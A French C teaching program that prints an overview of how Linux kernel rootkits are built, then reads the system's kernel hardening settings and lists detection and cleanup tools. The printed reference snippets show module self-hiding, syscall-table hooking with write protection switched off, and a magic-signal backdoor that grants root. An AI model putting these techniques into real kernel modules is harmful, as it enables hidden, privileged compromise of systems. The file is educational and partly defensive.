/*
 * OBJECTIF  : Comprendre l'architecture complete d'un rootkit Linux
 * PREREQUIS : LKM, syscall hooking, process/file/network hiding
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme presente l'architecture globale d'un rootkit Linux :
 * comment toutes les techniques se combinent, les rootkits celebres,
 * la detection et les protections. Synthese des modules precedents.
 * Demonstration pedagogique - pas de rootkit fonctionnel.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <errno.h>

/*
 * Etape 1 : Architecture d'un rootkit Linux
 */
static void explain_architecture(void) {
    printf("[*] Etape 1 : Architecture d'un rootkit Linux\n\n");

    printf("    ┌──────────────────────────────────────────────────┐\n");
    printf("    │              ROOTKIT LKM                          │\n");
    printf("    │                                                  │\n");
    printf("    │  ┌────────────────────────────────────────┐      │\n");
    printf("    │  │  Init : module_init()                  │      │\n");
    printf("    │  │  1. Se cacher de lsmod                 │      │\n");
    printf("    │  │  2. Trouver la syscall table            │      │\n");
    printf("    │  │  3. Installer les hooks                │      │\n");
    printf("    │  │  4. Configurer la backdoor             │      │\n");
    printf("    │  └────────────────────────────────────────┘      │\n");
    printf("    │                                                  │\n");
    printf("    │  ┌──── HOOKS ────────────────────────────┐       │\n");
    printf("    │  │ getdents64 -> cacher fichiers + procs │       │\n");
    printf("    │  │ kill       -> backdoor par signal      │       │\n");
    printf("    │  │ read       -> modifier les lectures    │       │\n");
    printf("    │  │ seq_show   -> cacher les connexions    │       │\n");
    printf("    │  └───────────────────────────────────────┘       │\n");
    printf("    │                                                  │\n");
    printf("    │  ┌──── FEATURES ─────────────────────────┐       │\n");
    printf("    │  │ Process hiding  (getdents + /proc)    │       │\n");
    printf("    │  │ File hiding     (getdents + stat)     │       │\n");
    printf("    │  │ Network hiding  (seq_show + netfilter)│       │\n");
    printf("    │  │ Privilege escalation (commit_creds)   │       │\n");
    printf("    │  │ Backdoor        (magic signal/packet) │       │\n");
    printf("    │  │ Keylogger       (keyboard interrupt)  │       │\n");
    printf("    │  │ Self-hiding     (list_del module)     │       │\n");
    printf("    │  └───────────────────────────────────────┘       │\n");
    printf("    └──────────────────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : Code de reference - init d'un rootkit
 */
static void show_rootkit_init(void) {
    printf("[*] Etape 2 : Code d'initialisation d'un rootkit (reference)\n\n");

    printf("    static int __init rootkit_init(void) {\n");
    printf("        // 1. Se cacher de lsmod et /proc/modules\n");
    printf("        list_del(&THIS_MODULE->list);\n");
    printf("        kobject_del(&THIS_MODULE->mkobj.kobj);\n\n");

    printf("        // 2. Trouver la syscall table\n");
    printf("        struct kprobe kp = { .symbol_name = \"sys_call_table\" };\n");
    printf("        register_kprobe(&kp);\n");
    printf("        sys_call_table = (void *)kp.addr;\n");
    printf("        unregister_kprobe(&kp);\n\n");

    printf("        // 3. Sauvegarder les originaux\n");
    printf("        orig_getdents64 = sys_call_table[__NR_getdents64];\n");
    printf("        orig_kill = sys_call_table[__NR_kill];\n\n");

    printf("        // 4. Installer les hooks\n");
    printf("        disable_write_protection();\n");
    printf("        sys_call_table[__NR_getdents64] = hooked_getdents64;\n");
    printf("        sys_call_table[__NR_kill] = hooked_kill;\n");
    printf("        enable_write_protection();\n\n");

    printf("        // 5. Hook /proc/net/tcp pour masquer le reseau\n");
    printf("        hook_proc_net_tcp();\n\n");

    printf("        printk(KERN_INFO \"rootkit loaded\\n\");\n");
    printf("        return 0;\n");
    printf("    }\n\n");
}

/*
 * Etape 3 : Backdoor par signal magique
 */
static void explain_backdoor(void) {
    printf("[*] Etape 3 : Backdoor par signal magique\n\n");

    printf("    Le rootkit hooke sys_kill pour intercepter des signaux :\n\n");

    printf("    #define MAGIC_SIGNAL 63\n");
    printf("    #define CMD_HIDE_PID  1\n");
    printf("    #define CMD_SHOW_PID  2\n");
    printf("    #define CMD_ROOT      3\n");
    printf("    #define CMD_HIDE_FILE 4\n\n");

    printf("    asmlinkage long hooked_kill(pid_t pid, int sig) {\n");
    printf("        if (sig == MAGIC_SIGNAL) {\n");
    printf("            switch (pid) {\n");
    printf("            case CMD_ROOT:\n");
    printf("                // Donner root au processus appelant\n");
    printf("                struct cred *cred = prepare_creds();\n");
    printf("                cred->uid = cred->gid = GLOBAL_ROOT_UID;\n");
    printf("                cred->euid = cred->egid = GLOBAL_ROOT_UID;\n");
    printf("                commit_creds(cred);\n");
    printf("                break;\n");
    printf("            case CMD_HIDE_PID:\n");
    printf("                // Ajouter le PID courant a la liste cachee\n");
    printf("                add_hidden_pid(current->pid);\n");
    printf("                break;\n");
    printf("            }\n");
    printf("            return 0;\n");
    printf("        }\n");
    printf("        return orig_kill(pid, sig);\n");
    printf("    }\n\n");

    printf("    Utilisation :\n");
    printf("    kill -63 3  // Devenir root\n");
    printf("    kill -63 1  // Cacher son processus\n\n");
}

/*
 * Etape 4 : Rootkits Linux celebres
 */
static void explain_famous_rootkits(void) {
    printf("[*] Etape 4 : Rootkits Linux celebres\n\n");

    printf("    Rootkit      | Annee | Techniques\n");
    printf("    ─────────────|───────|──────────────────────────────\n");
    printf("    Reptile      | 2018  | LKM, ftrace hooks, backdoor\n");
    printf("    Diamorphine  | 2017  | LKM minimal, signal magic\n");
    printf("    Azazel       | 2014  | LD_PRELOAD (userland)\n");
    printf("    Jynx2        | 2012  | LD_PRELOAD, PAM backdoor\n");
    printf("    Adore-ng     | 2004  | LKM, VFS hooks\n");
    printf("    Knark        | 2001  | LKM, syscall table patch\n\n");

    printf("    Rootkits userland vs kernel :\n\n");
    printf("    Userland (LD_PRELOAD) :\n");
    printf("    + Facile a developper\n");
    printf("    + Pas besoin de root pour le dev\n");
    printf("    - Detectable par comparaison syscall\n");
    printf("    - Ne cache pas au niveau kernel\n\n");

    printf("    Kernel (LKM) :\n");
    printf("    + Invisible pour les outils userspace\n");
    printf("    + Controle total du systeme\n");
    printf("    - Necessite root pour charger\n");
    printf("    - Crash kernel si bug\n");
    printf("    - Bloque par module signing\n\n");
}

/*
 * Etape 5 : Verifier l'etat de securite du systeme
 */
static void check_system_security(void) {
    printf("[*] Etape 5 : Etat de securite du systeme\n\n");

    struct utsname uts;
    if (uname(&uts) == 0)
        printf("    Kernel : %s %s\n", uts.sysname, uts.release);

    /* Modules disabled */
    FILE *fp = fopen("/proc/sys/kernel/modules_disabled", "r");
    if (fp) {
        int val = 0;
        if (fscanf(fp, "%d", &val) == 1)
            printf("    modules_disabled  : %d (%s)\n", val,
                   val ? "PROTEGE" : "modules autorises");
        fclose(fp);
    }

    /* kptr_restrict */
    fp = fopen("/proc/sys/kernel/kptr_restrict", "r");
    if (fp) {
        int val = 0;
        if (fscanf(fp, "%d", &val) == 1)
            printf("    kptr_restrict     : %d (%s)\n", val,
                   val >= 2 ? "PROTEGE" : val == 1 ? "restreint" : "ouvert");
        fclose(fp);
    }

    /* dmesg_restrict */
    fp = fopen("/proc/sys/kernel/dmesg_restrict", "r");
    if (fp) {
        int val = 0;
        if (fscanf(fp, "%d", &val) == 1)
            printf("    dmesg_restrict    : %d (%s)\n", val,
                   val ? "PROTEGE" : "lisible par tous");
        fclose(fp);
    }

    /* Lockdown */
    fp = fopen("/sys/kernel/security/lockdown", "r");
    if (fp) {
        char val[64] = {0};
        if (fgets(val, sizeof(val), fp)) {
            val[strcspn(val, "\n")] = '\0';
            printf("    lockdown         : %s\n", val);
        }
        fclose(fp);
    }

    /* Nombre de modules */
    fp = fopen("/proc/modules", "r");
    if (fp) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp)) count++;
        fclose(fp);
        printf("    Modules charges  : %d\n", count);
    }
    printf("\n");
}

/*
 * Etape 6 : Detection et nettoyage
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et nettoyage de rootkits\n\n");

    printf("    Outils de detection :\n");
    printf("    ─────────────────────────────────────\n");
    printf("    rkhunter     : Scan de rootkits connus + anomalies\n");
    printf("    chkrootkit   : Detection de signatures de rootkits\n");
    printf("    LKRG         : Protection runtime du kernel\n");
    printf("    unhide       : Detecte processus/ports caches\n");
    printf("    Volatility   : Analyse forensique de la memoire\n\n");

    printf("    Verification manuelle :\n");
    printf("    ─────────────────────────────────────\n");
    printf("    1. Comparer syscall table avec System.map\n");
    printf("    2. Verifier /proc/modules vs lsmod\n");
    printf("    3. Comparer readdir() vs getdents64() direct\n");
    printf("    4. Scanner la memoire kernel pour des hooks\n");
    printf("    5. Analyser les traces ftrace/kprobes actifs\n\n");

    printf("    Nettoyage :\n");
    printf("    ─────────────────────────────────────\n");
    printf("    1. Demarrer sur un live CD/USB\n");
    printf("    2. Monter le filesystem en lecture seule\n");
    printf("    3. Verifier /lib/modules/ pour des .ko suspects\n");
    printf("    4. Verifier /etc/modules et /etc/modprobe.d/\n");
    printf("    5. Comparer les binaires avec un systeme propre\n");
    printf("    6. En cas de doute : reinstaller completement\n\n");
}

int main(void) {
    printf("[*] Demo : Rootkit Linux - Architecture complete\n\n");

    explain_architecture();
    show_rootkit_init();
    explain_backdoor();
    explain_famous_rootkits();
    check_system_security();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
